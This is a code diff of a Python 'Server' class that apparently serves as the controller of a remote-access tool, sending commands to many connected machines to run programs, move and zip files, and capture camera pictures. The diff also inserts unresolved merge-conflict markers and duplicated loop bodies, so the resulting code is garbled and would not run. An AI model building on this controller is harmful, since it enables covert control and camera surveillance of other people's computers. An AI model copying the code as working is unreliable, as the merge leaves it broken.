@@ -158,11 +158,28 @@ class Server:
                    "mode": mode,
                    "path": path,
                    "timeout": self.timeout}
+<<<<<<< HEAD
         for connection in connections:
             try:
                 self.connection.send(self.enc_request(request), connection)
                 response = self.dec_response(self.connection.recv(connection))
                 print(response["data"] + response["error"])
+            except socket.error as error:
+                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+
+    def execute_command(self, exe, connections):
+        request = {"cmd": "c",
+                   "exe": exe,
+                   "timeout": self.timeout}
+=======
+>>>>>>> 72693f10253976fdf0d943334d45ed54c4cc40cb
+        for connection in connections:
+            try:
+                self.connection.send(self.enc_request(request), connection)
+                response = self.dec_response(self.connection.recv(connection))
+                print(response["data"] + response["error"])
+<<<<<<< HEAD
+=======
             except socket.error as error:
                 self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)) + "\n")
 
@@ -175,8 +192,9 @@ class Server:
                 self.connection.send(self.enc_request(request), connection)
                 response = self.dec_response(self.connection.recv(connection))
                 print(response["data"] + response["error"])
+>>>>>>> 72693f10253976fdf0d943334d45ed54c4cc40cb
             except socket.error as error:
-                self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)) + "\n")
+                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
 
     def download_file(self, path_to_open, path_to_save, connections):
         request = {"cmd": "d",
@@ -198,9 +216,9 @@ class Server:
                     with open(path_to_save, "wb") as file:
                         file.write(data)
             except socket.error as error:
-                self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+                self.update_line("\rSocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
             except KeyboardInterrupt:
-                self.update_line("\r[-] DownloadCanceled")
+                self.update_line("\rDownloadCanceled")
             print()
 
     def upload_file(self, path_to_open, path_to_save, connections):
@@ -242,7 +260,7 @@ class Server:
                 response = self.dec_response(self.connection.recv(connection))
                 print(response["error"])
             except socket.error as error:
-                print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
 
     def zip_file_or_folder(self, path_to_open, path_to_save, connections):
         request = {"cmd": "z",
@@ -256,7 +274,7 @@ class Server:
                 response = self.dec_response(self.connection.recv(connection))
                 print(response["error"])
             except socket.error as error:
-                print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
 
     def capture_camera_picture(self, path_to_save, connections):
         request = {"cmd": "w",
@@ -269,7 +287,7 @@ class Server:
                 response = self.dec_response(self.connection.recv(connection))
                 print(response["error"])
             except socket.error as error:
-                print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)) + "\n")
 
     def get_conn_fgoi(self, objects):  # get connections from groups or indexs
         connections = list()
